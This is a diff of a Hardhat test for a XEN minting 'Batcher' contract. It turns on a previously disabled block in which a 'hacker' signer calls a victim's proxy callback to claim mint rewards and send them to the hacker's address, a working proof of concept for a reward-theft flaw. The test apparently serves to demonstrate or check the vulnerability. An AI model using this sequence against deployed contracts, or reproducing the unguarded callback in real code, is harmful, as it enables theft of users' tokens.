@@ -44,16 +44,15 @@ describe("Batcher", function () {
 
     // increase and mine time so we can claimReward
     await increaseTime(24*60*60);
-    if (false)
-      {
-        let hacker = (await hre.ethers.getSigners())[1];
-        let proxy = await batcher.proxyFor(signer.address, 0);
-        console.log("steal from #0 proxy", proxy, "XeN balance: ", (await xen.balanceOf(hacker.address)).toString());
-        proxy = new hre.ethers.Contract(proxy, batcher.interface, signer);
-        tx = await proxy.callback(xen.address, xen.interface.encodeFunctionData("claimMintRewardAndShare", [hacker.address, 100]));
-        await tx.wait();
-        console.log("done! XeN balance: ", (await xen.balanceOf(hacker.address)).toString());
-      }
+    {
+      let hacker = (await hre.ethers.getSigners())[1];
+      let proxy = await batcher.proxyFor(signer.address, 0);
+      console.log("steal from #0 proxy", proxy, "XeN balance: ", (await xen.balanceOf(hacker.address)).toString());
+      proxy = new hre.ethers.Contract(proxy, batcher.interface, signer);
+      tx = await proxy.callback(xen.address, xen.interface.encodeFunctionData("claimMintRewardAndShare", [hacker.address, 100]));
+      await tx.wait();
+      console.log("done! XeN balance: ", (await xen.balanceOf(hacker.address)).toString());
+    }
 
     console.log("batch claim reward");
     tx = await batcher.execute(xen.address, xen.interface.encodeFunctionData("claimMintRewardAndShare", [signer.address, 100]));
